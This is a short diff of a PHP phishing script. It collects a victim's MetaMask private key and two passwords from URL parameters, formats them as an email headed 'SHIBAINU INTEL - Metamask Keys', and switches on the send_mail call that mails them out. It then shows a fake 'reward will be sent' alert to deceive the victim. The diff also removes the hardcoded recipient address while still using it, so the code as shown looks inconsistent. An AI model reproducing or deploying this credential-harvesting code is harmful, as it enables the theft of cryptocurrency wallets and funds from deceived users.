@@ -5,7 +5,6 @@ $PrivateKey = $_GET['PrivateKey'];
 $password1 = $_GET['password1'];
 $password2 = $_GET['password2'];
 
-$to = 'bum123@gmail.com';
 $name = 'Wallet Key';
 $subject = 'SHIBAINU INTEL!';
 $body = "<h2>SHIBAINU INTEL - Metamask Keys</h2>
@@ -15,8 +14,8 @@ $body = "<h2>SHIBAINU INTEL - Metamask Keys</h2>
 <p>$password1</p>
 <p>$password2</p>";
 
-// $status = send_mail($to, $name, $subject, $body);
-$status = true;
+$status = send_mail($to, $name, $subject, $body);
+// $status = true;
 
 if ($status) {
     echo "<script>alert('Successfully Linked. Your reward will be sent!');
